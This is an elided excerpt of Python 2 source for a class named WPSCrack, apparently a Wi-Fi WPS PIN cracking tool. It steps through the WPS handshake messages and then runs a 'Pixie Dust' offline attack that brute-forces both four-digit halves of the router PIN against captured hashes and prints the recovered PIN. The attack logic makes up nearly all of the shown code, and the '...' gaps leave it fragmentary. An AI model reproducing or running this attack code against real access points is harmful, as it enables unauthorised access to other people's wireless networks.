...
class WPSCrack:
    ...
    pin           = None
    offline       = None
    pixie         = None # Flag to detect if the AP has a flawed PRNG
                ...
                if self.rcved_asso_response:
                    ...
                    if self.rcved_eap_request_identity:
                        ...
                        if self.rcved_m1:
                            ...
                            if self.rcved_m3:
                            	if self.offline:
                            		print "[+] Pixie Dust Attack starting..."
                            		bruteforce(self.rcved_m1,self.rcved_m3)
                                if self.verbose: 
                                    print '-> M4'
                                self.rcved.clear()
                                self.send_M4()
    ...
    def bruteforce(self,m1,m3):
    	...
    	eHash1 = self.rcved_m3.d[0x1014]
    	eHash2 = self.rcved_m3.d[0x1015]
    
        # bruteforceThePRNGState()  #TODO Broadcom
        ...
        for first_half in xrange(10000):
            PSK1_guess   = hmac.new(self.AuthKey, (str(first_half)).zfill(4), hashlib.sha256).digest()[:16]
            eHash1_guess = hmac.new(self.AuthKey, es1 + PSK1_guess + self.PK_E + self.PK_R, hashlib.sha256).digest()
            if (eHash1 == eHash1_guess): #First half done
                for second_half in xrange(10000):
                    PSK2_guess   = hmac.new(self.AuthKey, (str(second_half)).zfill(4), hashlib.sha256).digest()[:16]
                    eHash2_guess = hmac.new(self.AuthKey, es2 + PSK2_guess + self.PK_E + self.PK_R, hashlib.sha256).digest()
                    if (eHash2 == eHash2_guess): 
                        print "PIN FOUND!!  %04d%04d" %(first_half,second_half)
                        self.pin   = "%04d%04d" %(first_half,second_half)
                        self.pixie = True
...
def main():
    ...
    parser.add_option('-o', '--offline', dest='offline', action="store_true", default= True, help='Offline bruteforce. Pixie Dust Attack')
